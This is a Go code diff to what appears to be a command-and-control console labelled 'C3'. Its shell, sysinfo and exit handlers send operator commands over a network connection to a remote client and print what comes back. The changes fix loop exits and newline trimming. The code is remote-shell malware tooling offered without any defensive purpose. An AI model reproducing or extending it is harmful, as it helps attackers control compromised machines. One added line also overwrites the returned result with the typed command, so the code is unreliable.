@@ -18,26 +18,25 @@ func shell(conn net.Conn) {
 	enc := gob.NewEncoder(conn)
 	dec := gob.NewDecoder(conn)
 
-	for {
+	shellLoop:for {
 		fmt.Printf(color.Green + "[shell]: " + color.Reset)
 		cmd, _ := bufio.NewReader(os.Stdin).ReadString('\n')
-
-
+		cmd = strings.TrimSuffix(cmd, "\n")
 
 		switch {
 		case cmd == "\r":
 			continue
-		case cmd == "close\n":
+		case cmd == "close":
 			enc.Encode(cmd)
-			break
+			break shellLoop
 		default:
 			result := ""
 			enc.Encode(cmd)
 			dec.Decode(&result)
+			result = strings.TrimSuffix(cmd, "\n")
 			fmt.Println(string(result))
 		}
 	}
-	conn.Close()
 }
 
 
@@ -64,20 +63,22 @@ func sysinfo(conn net.Conn) {
 func exit(conn net.Conn) {
 	enc := gob.NewEncoder(conn)
 	enc.Encode("exit")
+	conn.Close()
 }
 
 
 func handleConnection(conn net.Conn) {
-	for {
+	connLoop:for {
 		fmt.Printf(color.Blue + "[C3]: " + color.Reset)
 		reader, _ := bufio.NewReader(os.Stdin).ReadString('\n')
 		reader = strings.TrimSuffix(reader, "\n")
 
 		switch {
-		case reader == "\r\n":
+		case reader == "\r":
 			continue
 		case reader == "exit":
 			exit(conn)
+			break connLoop
 		case reader == "shell":
 			shell(conn)
 		case reader == "sysinfo":
@@ -86,6 +87,7 @@ func handleConnection(conn net.Conn) {
 			fmt.Println(color.Red + "[ERROR]: " + color.Reset + "Invalid command")
 		}
 	}
+
 }
 
 
